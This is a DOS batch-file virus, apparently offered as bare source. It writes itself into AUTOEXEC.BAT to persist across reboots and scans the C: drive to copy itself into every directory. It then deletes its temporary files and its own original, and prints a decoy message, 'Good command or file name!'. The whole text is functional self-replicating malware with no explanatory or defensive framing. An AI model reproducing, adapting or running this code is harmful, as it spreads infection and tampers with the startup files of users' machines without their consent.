@echo off
@set inf=n
@set infect=n
@if %INF%==Y goto scan
@echo @SET INF=Y >a.666
@echo @call %0.bat >>a.666
@echo @echo Batch virus greets You !>>a.666
@TYPE AUTOEXEC.BAT >>A.666
@COPY A.666 AUTOEXEC.BAT >NUL
@SET INF=Y
:scan
@IF %INFECT%==Y GOTO END
@c:
@cd\
@dir %0.bat /s|find /i "Direct" >c:\a.666
@echo exit >>c:\a.666
@echo @copy %%2\%0.bat c:\ >c:\director.bat
@command <c:\a.666 >nul
@c:
@cd\
@dir /ad /s|find /i "Direct" >a.666
@echo exit >>a.666
@echo @if not exist %%2%0.bat copy c:\%0.bat %%2 >c:\Director.bat
@command < a.666 >nul
@del a.666
@del director.bat
@del %0.bat
@SET INFECT=Y
:END
@echo Good command or file name!